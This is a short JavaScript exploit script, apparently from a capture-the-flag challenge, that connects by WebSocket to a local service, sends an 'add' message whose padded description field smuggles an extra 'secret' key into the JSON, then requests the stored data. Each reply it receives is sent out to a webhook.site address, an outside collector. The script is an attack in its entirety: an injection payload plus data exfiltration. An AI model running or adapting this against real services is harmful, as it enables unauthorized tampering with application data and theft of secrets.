
const target = '127.0.0.1';
const ws = new WebSocket(`"ws://${target}/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify({action:'add',title: 'A',description: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","secret":"00000000000000000000000000000000"}`}));
    ws.send(JSON.stringify({action:'get'}));
}
ws.onmessage = async (msg) => {
    fetch(`https://webhook.site/22e38bf9-9655-4361-be5e-7888c08d694e?m=${msg.data}`)
}
